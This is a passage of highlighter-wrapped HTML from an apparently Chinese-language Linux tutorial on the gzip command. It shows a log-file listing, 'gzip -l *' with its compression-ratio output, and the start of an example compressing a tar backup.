&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-42&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-43&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;     &lt;span class=&quot;crayon-cn&quot;&gt;61&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-44&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-45&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;       &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2014&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-46&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-47&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;       &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2015&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-48&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-49&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;       &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2016&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-50&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-51&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;       &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2017&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-52&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-53&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;#&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0096 seconds] --&gt;
&lt;p&gt;说明：&lt;/p&gt;
&lt;p&gt;实例3：详细显示例1中每个压缩的文件的信息，并不解压&lt;/p&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b12c9a9b6f325453337&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
gzip -l *&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b6f325453337-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b6f325453337-1&quot;&gt;
&lt;span class=&quot;crayon-i&quot;&gt;gzip&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0004 seconds] --&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b12c9a9b72859053436&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
[root@localhost test6]# gzip -l *

         compressed        uncompressed  ratio uncompressed_name

               1341              302108  99.6% linklog.log

               1341              302108  99.6% log2012.log

                 70                  61  47.5% log2013.log

                 32                   0   0.0% log2014.log

                 32                   0   0.0% log2015.log

                 32                   0   0.0% log2016.log

                 32                   0   0.0% log2017.log

               2880              604277  99.5% (totals)&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b72859053436-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b72859053436-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b72859053436-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b72859053436-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b72859053436-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b72859053436-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b72859053436-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b72859053436-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b72859053436-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b72859053436-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b72859053436-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b72859053436-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b72859053436-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b72859053436-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b72859053436-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b72859053436-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b72859053436-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b72859053436-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b72859053436-19&quot;&gt;19&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b72859053436-1&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# gzip -l *&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b72859053436-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b72859053436-3&quot;&gt;         &lt;span class=&quot;crayon-i&quot;&gt;compressed&lt;/span&gt;        &lt;span class=&quot;crayon-i&quot;&gt;uncompressed&lt;/span&gt;  &lt;span class=&quot;crayon-i&quot;&gt;ratio&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;uncompressed&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;_&lt;/span&gt;name&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b72859053436-4&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b72859053436-5&quot;&gt;               &lt;span class=&quot;crayon-cn&quot;&gt;1341&lt;/span&gt;              &lt;span class=&quot;crayon-cn&quot;&gt;302108&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;99.6&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;linklog&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b72859053436-6&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b72859053436-7&quot;&gt;               &lt;span class=&quot;crayon-cn&quot;&gt;1341&lt;/span&gt;              &lt;span class=&quot;crayon-cn&quot;&gt;302108&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;99.6&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2012&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b72859053436-8&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b72859053436-9&quot;&gt;                 &lt;span class=&quot;crayon-cn&quot;&gt;70&lt;/span&gt;                  &lt;span class=&quot;crayon-cn&quot;&gt;61&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;47.5&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b72859053436-10&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b72859053436-11&quot;&gt;                 &lt;span class=&quot;crayon-cn&quot;&gt;32&lt;/span&gt;                   &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;0.0&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2014&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b72859053436-12&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b72859053436-13&quot;&gt;                 &lt;span class=&quot;crayon-cn&quot;&gt;32&lt;/span&gt;                   &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;0.0&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2015&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b72859053436-14&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b72859053436-15&quot;&gt;                 &lt;span class=&quot;crayon-cn&quot;&gt;32&lt;/span&gt;                   &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;0.0&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2016&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b72859053436-16&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b72859053436-17&quot;&gt;                 &lt;span class=&quot;crayon-cn&quot;&gt;32&lt;/span&gt;                   &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;0.0&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2017&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b72859053436-18&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b72859053436-19&quot;&gt;               &lt;span class=&quot;crayon-cn&quot;&gt;2880&lt;/span&gt;              &lt;span class=&quot;crayon-cn&quot;&gt;604277&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;99.5&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;totals&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0031 seconds] --&gt;
&lt;p&gt;说明：&lt;/p&gt;
&lt;p&gt;实例4：压缩一个tar备份文件，此时压缩文件的扩展名为.tar.gz&lt;/p&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b12c9a9b75785086719&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
gzip -r log.tar&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
